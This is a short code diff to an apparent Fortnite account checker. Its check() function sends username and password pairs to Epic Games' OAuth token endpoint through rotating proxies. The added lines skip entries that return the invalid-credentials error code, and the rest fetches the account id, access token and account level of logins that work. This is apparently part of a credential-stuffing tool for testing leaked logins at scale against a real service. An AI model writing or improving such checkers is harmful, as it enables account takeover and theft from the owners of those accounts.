@@ -29,6 +29,9 @@ def check(x):
             r_one = requests.post(url="https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token",
                                   headers=header_one, data=body, timeout=settings.fortnite.timeout, proxies=proxs_list[1])
             r_one_json = r_one.json()
+            if r_one_json.get("numericErrorCode") == 18031:
+                # this code means invalid password or username
+                break
             account_id = r_one_json["account_id"]
             access_token = r_one_json["access_token"]
             account_level = stats(account_id=account_id, access_token=access_token, proxs_list=proxs_list)
